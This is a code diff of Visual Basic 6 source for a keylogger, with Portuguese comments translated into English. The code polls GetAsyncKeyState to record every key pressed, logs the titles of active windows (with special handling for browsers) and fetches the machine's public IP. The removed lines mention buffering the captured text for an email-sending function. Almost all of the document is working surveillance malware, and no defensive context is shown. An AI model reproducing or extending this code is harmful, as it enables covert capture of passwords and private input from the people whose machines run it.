@@ -37,12 +37,11 @@ Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (
     Private Declare Function GetForegroundWindow Lib "user32.dll" () As Long
     
 Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer 'import para capturar numero da tecla pressionada
-'guarda conteudo da text1 nesta string para que a função que envia email possa processar o objeto
-Dim textbuffer As String
 Dim textbuffer_janela As String
 Dim num_janela As Long
+
+'read current window title
 Private Function GetActiveWindowTitle() As String
-'faz a leitura do titulo da tela
 Dim textlen As Long
 Dim titlebar As String
 Dim slength As Long
@@ -54,7 +53,7 @@ titlebar = Left(titlebar, slength)
 GetActiveWindowTitle = titlebar
 End Function
 
-
+'get ip address using one ip check service and extract the ip information (surronded by <h3> html tag)
 Public Function getIpAdress()
 Dim posicaoH3 As Integer
 Dim objHttp As Object, strURL As String, strText As String
@@ -72,6 +71,7 @@ strText = Mid$(strText, posicaoH3, 50)
 getIpAdress = strText
 End Function
 
+'function that returns the pressed character
 Public Function retorna_tecla_function()
 Dim retorna_tecla As String
 Dim i As Integer, x As Integer
@@ -170,7 +170,7 @@ If i = 186 Then retorna_tecla = retorna_tecla + "Ç"
 If i = 160 Then retorna_tecla = retorna_tecla + " [Shift] "
 If i = 18 Then retorna_tecla = retorna_tecla + " [lfAlt] "
 If i = vbKeyNumlock Then retorna_tecla = retorna_tecla + " [NumLock] "
-'no if do select não tratar, retorna o numero do char
+'if key is unknow by the function, returns ANSII code of the key
 If retorna_tecla = "" Then retorna_tecla = "{" + Str(i) + "}"
 
 End If
@@ -179,17 +179,6 @@ retorna_tecla_function = retorna_tecla_function + retorna_tecla
 retorna_tecla = ""
 End Function
 
-
-Private Sub read_buffer(ByVal param As Integer)
-'função que armazena o presente conteudo do arquivo em um buffer para que seja processado pela função de envio de email
-If param = 1 Then
-textbuffer = Text1.Text
-Text1.Text = ""
-Else
-textbuffer = ""
-End If
-
-End Sub
 
 
 Private Sub Form_Load()
@@ -204,6 +193,10 @@ End Sub
 Private Sub Timer1_Timer()
  Text1.Text = Text1.Text + retorna_tecla_function
 End Sub
+
+'the code below records the title of the window in the buffer
+'RULES: Write only if title is different than last wirited and current active window is different than last corrent window
+'If current active window is one browser the active window different rule is ignored.
 
 Private Sub Timer2_Timer()
 Dim verifica_aba
